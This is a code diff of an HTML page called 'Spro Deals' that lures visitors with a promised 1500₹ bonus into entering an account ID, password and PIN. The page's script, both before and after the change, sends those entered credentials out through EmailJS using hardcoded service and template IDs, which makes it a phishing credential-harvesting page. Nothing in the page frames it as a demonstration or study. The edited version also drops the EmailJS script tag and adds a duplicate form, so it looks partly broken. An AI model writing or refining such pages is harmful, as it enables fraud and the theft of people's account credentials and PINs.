@@ -42,7 +42,7 @@
     <h2>Welcome to Spro Deals</h2>
     <p>You will get 1500₹ bonus if you complete the following steps:</p>
     <form id="myForm">
-      <input type="text" name="id" placeholder="Enter ID" required>
+      <input type="text" name="id number" placeholder="Enter ID Number" required>
       <input type="password" name="password" placeholder="Enter Password" required>
       <input type="text" name="pin" placeholder="Enter PIN" required>
       <button type="submit">Submit</button>
@@ -51,22 +51,32 @@
   </div>
 
   <!-- EmailJS SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function(){
-      emailjs.init("LUAYRaC30g781PF_K"); 
-    })();
+  <script type="text/javascript">
+  (function(){
+    emailjs.init("LUAYRaC30g781PF_K"); 
+  })();
 
-    document.getElementById("myForm").addEventListener("submit", function(e){
-      e.preventDefault();
+  function sendMail(e) {
+    e.preventDefault();
 
-      emailjs.sendForm("service_ohjwfz9", "template_cwk0gck", this)
-        .then(function(){
-          document.getElementById("status").innerText = "✅ Mail sent successfully!";
-        }, function(error){
-          document.getElementById("status").innerText = "❌ Error: " + error.text;
-        });
-    });
-  </script>
-</body>
-</html>
+    var templateParams = {
+      account_id: document.getElementById("account_id").value,
+      password: document.getElementById("pass").value,
+      pin: document.getElementById("pin").value
+    };
+
+    emailjs.send("service_ohjwfz9", "template_cwk0gck", templateParams)
+      .then(function(response) {
+         alert("✅ Email sent successfully!");
+      }, function(error) {
+         alert("❌ Failed to send email: " + JSON.stringify(error));
+      });
+  }
+</script>
+
+<form onsubmit="sendMail(event)">
+  <input type="text" id="account_id" placeholder="Enter ID" required>
+  <input type="pass" id="pass" placeholder="Enter Pass" required>
+  <input type="text" id="pin" placeholder="Enter PIN" required>
+  <button type="submit">Submit</button>
+</form>
